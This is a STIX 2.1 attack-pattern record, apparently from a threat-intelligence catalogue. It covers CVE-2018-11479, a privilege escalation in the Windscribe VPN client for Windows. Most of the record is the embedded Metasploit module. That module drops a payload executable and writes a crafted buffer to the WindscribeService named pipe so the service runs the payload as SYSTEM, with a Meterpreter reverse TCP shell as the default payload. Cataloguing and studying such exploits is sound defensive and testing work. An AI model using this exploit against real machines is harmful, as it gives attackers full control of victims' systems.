{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--237295bc-d4fd-488f-901b-705ca243abd5",
    "created": "2024-08-14T16:49:29.84463Z",
    "modified": "2024-08-14T16:49:29.844634Z",
    "name": "Windscribe WindscribeService Named Pipe Privilege Escalation",
    "description": " The Windscribe VPN client application for Windows makes use of a Windows service `WindscribeService.exe` which exposes a named pipe `\\.\\pipe\\WindscribeService` allowing execution of programs with elevated privileges.  Windscribe versions prior to 1.82 do not validate user-supplied program names, allowing execution of arbitrary commands as SYSTEM.  This module has been tested successfully on Windscribe versions 1.80 and 1.81 on Windows 7 SP1 (x64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/windscribe_windscribeservice_priv_esc.rb",
            "external_id": "windscribe_windscribeservice_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-11479"
        },
        {
            "source_name": "reference",
            "url": "http://blog.emingh.com/2018/05/windscribe-vpn-privilege-escalation.html"
        },
        {
            "source_name": "reference",
            "url": "https://pastebin.com/eLG3dpYK"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::EXE\n  include Post::File\n  include Post::Windows::Priv\n  include Post::Windows::Services\n  include Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windscribe WindscribeService Named Pipe Privilege Escalation',\n        'Description' => %q{\n          The Windscribe VPN client application for Windows makes use of a\n          Windows service `WindscribeService.exe` which exposes a named pipe\n          `\\.\\pipe\\WindscribeService` allowing execution of programs with\n          elevated privileges.\n\n          Windscribe versions prior to 1.82 do not validate user-supplied\n          program names, allowing execution of arbitrary commands as SYSTEM.\n\n          This module has been tested successfully on Windscribe versions\n          1.80 and 1.81 on Windows 7 SP1 (x64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Emin Ghuliev', # Discovery and exploit\n          'bcoles' # Metasploit\n        ],\n        'References' => [\n          ['CVE', '2018-11479'],\n          ['URL', 'http://blog.emingh.com/2018/05/windscribe-vpn-privilege-escalation.html'],\n          ['URL', 'https://pastebin.com/eLG3dpYK']\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [['Automatic', {}]],\n        'DisclosureDate' => '2018-05-24',\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n        },\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [false, 'A directory where we can write files (%TEMP% by default)', nil]),\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].blank? ? session.sys.config.getenv('TEMP') : datastore['WritableDir'].to_s\n  end\n\n  def write_named_pipe(pipe, command)\n    kt = \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    kt << \"\\x00\\x00\\x00\\x00\"\n    kt << [command.force_encoding('UTF-8').codepoints.map { |c| \"%04X\" % c }.join].pack('H*')\n    kt << \"\\x00\" * (32_005 - kt.length)\n\n    print_status \"Sending #{command} to #{pipe} ...\"\n\n    r = session.railgun.kernel32.CreateFileA(pipe, 'GENERIC_READ | GENERIC_WRITE', 0, nil, 'OPEN_EXISTING', 0, nil)\n    handle = r['return']\n\n    if handle == 0xffffffff # INVALID_HANDLE_VALUE\n      print_error \"Invalid handle. #{pipe} named pipe not found, or already opened\"\n      return false\n    end\n\n    vprint_good(\"Opended #{pipe}! Proceeding ...\")\n\n    begin\n      w = client.railgun.kernel32.WriteFile(handle, kt, kt.length, 4, nil)\n      if w['return'] == false\n        return false\n      end\n    ensure\n      session.railgun.kernel32.CloseHandle(handle)\n    end\n\n    true\n  rescue\n    false\n  end\n\n  def check\n    service = 'WindscribeService'\n\n    unless service_exists? service\n      return CheckCode::Safe(\"Service '#{service}' does not exist\")\n    end\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    unless check == CheckCode::Detected\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    if is_system?\n      fail_with Failure::BadConfig, 'Session already has SYSTEM privileges'\n    end\n\n    payload_path = \"#{base_dir}\\\\#{Rex::Text.rand_text_alphanumeric(8..10)}.exe\"\n    payload_exe = generate_payload_exe\n    vprint_status \"Writing payload (#{payload.encoded.length} bytes) to #{payload_path} ...\"\n    write_file payload_path, payload_exe\n    register_file_for_cleanup payload_path\n\n    unless write_named_pipe(\"\\\\\\\\.\\\\pipe\\\\WindscribeService\", payload_path)\n      fail_with Failure::Unknown, 'Failed to write to pipe'\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-05-24",
    "x_mitre_platforms": [
        "['win']"
    ]
}